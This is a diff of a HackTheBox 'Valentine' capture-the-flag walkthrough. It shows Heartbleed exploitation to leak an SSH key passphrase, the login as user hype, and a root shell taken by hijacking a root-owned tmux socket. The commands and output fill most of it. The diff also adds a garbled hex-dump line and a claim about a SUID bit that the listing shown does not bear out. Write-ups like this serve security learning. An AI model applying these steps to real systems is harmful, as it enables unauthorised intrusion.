@@ -4,7 +4,7 @@ title: Hackthebox Valentine Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-15/valentine.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/valentine.png)
 
 # Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
@@ -128,10 +128,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ## 2. Getting User
 We have file listing at `http://10.10.10.79/dev`.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-15/omg.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/2020-04-17-23-09-39.png)
 
 At `http://10.10.10.79/dev/hype_key`, we can find hex characters.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-15/omg.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/2020-04-17-23-07-19.png)
 
 We can decode the hex characters with the following command.<br>
 It is an RSA private key.
@@ -169,7 +169,7 @@ RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 -----END RSA PRIVATE KEY-----
 ```
 
-Try to login with the SSH key.<br>
+Try to log in with the SSH key.<br>
 However, we get password prompt.
 ```shell
 root@kali:~# curl http://10.10.10.79/dev/hype_key -s | xxd -r -p > hype_key
@@ -181,7 +181,7 @@ Enter passphrase for key 'hype_key':
 ```
 
 On the top page, we have an image an woman with `bleeding heart`.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-15/omg.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/omg.png)
 
 Then, try to check if this has <a href="https://heartbleed.com/">Heartbleed</a>.<br>
 We can confirm that this server is vulnerable.
@@ -223,8 +223,8 @@ OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                
 Shellcodes: No Result
 ```
 
-This time, `OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure` has been used.<br>
-We have an interesting parameter `$text=`.
+This time, <a href="https://www.exploit-db.com/exploits/32764">OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure</a> has been used.<br>
+Running several times, we can get an interesting parameter `$text=`.
 ```shell
 root@kali:~# python 32764.py 10.10.10.79
 Trying SSL 3.0...
@@ -243,7 +243,8 @@ Received heartbeat response:
   0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
   0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
   0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
-  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  0050: 03 00 0A C0 13 C 009 C0 1F C0 1E 00 33 00 32 00  ............3.2.
+  i
   0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
   0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
   0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
@@ -272,7 +273,7 @@ Decode the base64 text.
 root@kali:~# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
 heartbleedbelievethehype
 ```
-
+Using the ssh key and key passphrase found in the previous step, we can log in to the `Valentine` as an user `hype`.
 ```shell
 root@kali:~# ssh -i hype_key hype@10.10.10.79
 Enter passphrase for key 'hype_key': 
@@ -287,7 +288,7 @@ Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
 hype@Valentine:~$ 
 ```
 
-
+`user.txt` is in a directory `/home/hype/Desktop`.
 ```shell
 hype@Valentine:~$ cat Desktop/user.txt 
 e6710a5464769fd5fcd216e076961750
@@ -295,7 +296,8 @@ e6710a5464769fd5fcd216e076961750
 
 
 ## 3. Getting Root
-
+In `.bash_history`, we have some command histories.<br>
+`tmux` has been executed several times and we can find a session file `/.devs/dev_sess` was attached.
 ```shell
 hype@Valentine:~$ cat .bash_history
 
@@ -314,16 +316,18 @@ tmux -S /.devs/dev_sess
 exit
 ```
 
+Take a look at `/.devs/dev_sess`. We can confirm that this is owned by `root` and SUID bit is set.
 ```shell
 hype@Valentine:/.devs$ ls -l
 total 0
 srw-rw---- 1 root hype 0 Apr 17 12:58 dev_sess
 ```
 
+Attach the tmux session with this command.<br>
+We can achieve a root shell. As always, `root.txt` is in the directory `/root`.
 ```shell
 hype@Valentine:/.devs$ tmux -S /.devs/dev_sess
 ```
-
 ```shell
 root@Valentine:/.devs# id
 uid=0(root) gid=0(root) groups=0(root)
